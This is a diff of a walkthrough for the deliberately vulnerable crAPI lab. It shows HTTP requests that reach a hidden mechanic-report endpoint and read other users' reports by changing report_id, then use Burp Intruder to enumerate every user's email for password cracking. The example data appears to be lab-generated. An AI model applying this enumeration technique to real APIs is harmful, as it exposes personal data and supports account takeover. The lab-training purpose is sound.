@@ -305,7 +305,15 @@ crAPI allows vehicle owners to contact their mechanics by submitting a "contact 
  POST /workshop/api/merchant/contact_mechanic HTTP/1.1
 Host: crapi.apisec.ai
 
-{"mechanic_code":"TRAC_JME","problem_details":"Also, when I bought this car, it smelled like a dirty sock. Pls fix","vin":"6CZTY05UVQT584223","mechanic_api":"http://crapi.apisec.ai/workshop/api/mechanic/receive_report","repeat_request_if_failed":false,"number_of_repeats":1}
+{
+  "mechanic_code": "TRAC_JME",
+  "problem_details": "Also, when I bought this car, it smelled like a dirty sock. Pls fix",
+  "vin": "6CZTY05UVQT584223",
+  "mechanic_api": "http://crapi.apisec.ai/workshop/api/mechanic/receive_report",
+  "repeat_request_if_failed": false,
+  "number_of_repeats": 1
+}
+
 ```
 <br>
 
@@ -318,26 +326,47 @@ Resp
 The hidden endpoint you need to access is displayed in the response, you will need to create a custom request. and access a `report_id` other than your own.
 
 ```http
-GET /workshop/api/mechanic/mechanic_report?report_id=60 HTTP/1.1
-Host: crapi.apisec.ai
+GET /workshop/api/mechanic/mechanic_report?report_id=5 HTTP/1.1
+Host: crapi.apisec.
 
 ```
 <br>
 
 Resp
 ```json
-{"id":60,"mechanic":{"id":2,"mechanic_code":"TRAC_JME","user":{"email":"james@example.com","number":""}},"vehicle":{"id":78,"vin":"3GUFQ83RVSV653919","owner":{"email":"hack101@email.com","number":"2223345421314"}
+{
+  "id": 5,
+  "mechanic": {
+    "id": 2,
+    "mechanic_code": "TRAC_JME",
+    "user": {
+      "email": "james@example.com",
+      "number": ""
+    }
+  },
+  "vehicle": {
+    "id": 45,
+    "vin": "4FTVZ46ZYHU404703",
+    "owner": {
+      "email": "adam007@example.com",
+      "number": "9876895423"
+    }
+  },
+  "problem_details": "My car Lamborghini - Aventador is having issues.\nCan you give me a call on my mobile 9876895423,\nOr send me an email at adam007@example.com \nThanks,\nAdam.\n",
+  "status": "Pending",
+  "created_on": "11 February, 2025, 14:05:42"
+}
 ```
 <br>
 
 ### You can then send one of these requests to Intruder and get all users email addys to use to crack passwords/break authentication
 ```http
-GET /workshop/api/mechanic/mechanic_report?report_id=42 HTTP/1.1
+GET /workshop/api/mechanic/mechanic_report?report_id=5 HTTP/1.1
 Host: crapi.apisec.ai
 ```
 <br>
 
-set position for the value of `report_id` 
+You can manually guess report Ids, or send to intruderset position for the value of `report_id` 
 ```http
 GET /workshop/api/mechanic/mechanic_report?report_id=§ § HTTP/1.1
 Host: crapi.apisec.ai
